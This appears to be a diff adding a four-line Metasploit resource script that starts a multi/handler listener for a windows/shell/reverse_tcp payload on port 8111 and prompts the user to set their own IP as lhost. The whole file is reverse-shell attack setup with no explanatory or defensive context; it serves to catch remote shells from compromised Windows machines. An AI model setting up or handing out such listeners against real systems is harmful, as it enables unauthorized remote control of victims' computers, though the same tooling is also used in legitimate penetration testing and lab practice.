@@ -1,0 +1,4 @@
+use exploit/multi/handler
+set Payload windows/shell/reverse_tcp
+set lport 8111
+echo Set your ip with: set lhost "(Your ip)"
